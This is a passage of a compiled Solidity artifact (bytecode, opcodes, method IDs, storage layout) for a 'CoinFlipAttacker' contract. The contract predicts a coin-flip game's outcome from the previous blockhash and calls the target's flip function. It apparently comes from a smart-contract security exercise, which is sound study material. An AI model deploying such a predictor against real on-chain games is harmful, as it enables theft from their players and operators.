40523d82523d6000602084013e6101d1565b606091505b50505050565b60006101e161035b565b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561025a57600080fd5b505af115801561026e573d6000803e3d6000fd5b505050506040513d602081101561028457600080fd5b81019080805190602001909291905050505050565b60006102a361035b565b9050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561031c57600080fd5b505af1158015610330573d6000803e3d6000fd5b505050506040513d602081101561034657600080fd5b81019080805190602001909291905050505050565b6000806103726001436103b090919063ffffffff16565b4060001c9050600061038f600354836103fa90919063ffffffff16565b90506000600182146103a25760006103a5565b60015b905080935050505090565b60006103f283836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250610444565b905092915050565b600061043c83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250610504565b905092915050565b60008383111582906104f1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156104b657808201518184015260208101905061049b565b50505050905090810190601f1680156104e35780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080831182906105b0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561057557808201518184015260208101905061055a565b50505050905090810190601f1680156105a25780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385816105bc57fe5b04905080915050939250505056fea2646970667358221220472440feb7c915c1829ba2290c8732c55c57dc31af063220e0fedf42591026ca64736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x3 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x73A CODESIZE SUB DUP1 PUSH2 0x73A DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x57 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x600 DUP1 PUSH2 0x13A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1A13FF68 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x83E00525 EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xB6F02DB9 EQ PUSH2 0x5A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x64 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x58 PUSH2 0x1D7 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x62 PUSH2 0x299 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH2 0x6E PUSH2 0x35B JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0x40 MLOAD PUSH1 0x24 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x1D263F6700000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x16A JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x147 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1CC JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D1 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1E1 PUSH2 0x35B JUMP JUMPDEST SWAP1 POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x25A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x26E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x284 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A3 PUSH2 0x35B JUMP JUMPDEST SWAP1 POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x31C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x330 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x346 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x372 PUSH1 0x1 NUMBER PUSH2 0x3B0 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH2 0x38F PUSH1 0x3 SLOAD DUP4 PUSH2 0x3FA SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x3A2 JUMPI PUSH1 0x0 PUSH2 0x3A5 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP1 SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3F2 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH2 0x444 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x43C DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x504 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0x4F1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x4B6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x49B JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x4E3 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 GT DUP3 SWAP1 PUSH2 0x5B0 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x575 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x55A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x5A2 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 DUP2 PUSH2 0x5BC JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFBALANCE 0x24 BLOCKHASH INVALID 0xB7 0xC9 ISZERO 0xC1 DUP3 SWAP12 LOG2 0x29 0xC DUP8 ORIGIN 0xC5 0x5C JUMPI 0xDC BALANCE 0xAF MOD ORIGIN KECCAK256 0xE0 INVALID 0xDF TIMESTAMP MSIZE LT 0x26 0xCA PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "307200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attackByCall()": "infinite",
						"attackByIns()": "infinite",
						"attackByInterface()": "infinite"
					},
					"internal": {
						"getFlip()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attackByCall()": "1a13ff68",
					"attackByIns()": "83e00525",
					"attackByInterface()": "b6f02db9"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 100,
						"contract": "contract/security/CoinFlipAttacker.sol:CoinFlipAttacker",
						"label": "addr",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 102,
						"contract": "contract/security/CoinFlipAttacker.sol:CoinFlipAttacker",
						"label": "cf_ins",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(CoinFlip)87"
					},
					{
						"astId": 104,
						"contract": "contract/security/CoinFlipAttacker.sol:CoinFlipAttacker",
						"label": "cf_interface",
						"offset": 0,
						"slot": "2",
						"type": "t_contract(CoinFlipInterface)95"
					},
					{
						"astId": 107,
						"contract": "contract/security/CoinFlipAttacker.sol:CoinFlipAttacker",
						"label": "FACTOR",
						"offset": 0,
						"slot": "3",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(CoinFlip)87": {
						"encoding": "inplace",
						"label": "contract CoinFlip",
						"numberOfBytes": "20"
					},
					"t_contract(CoinFlipInterface)95": {
						"encoding": "inplace",
						"label": "contract CoinFlipInterface",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}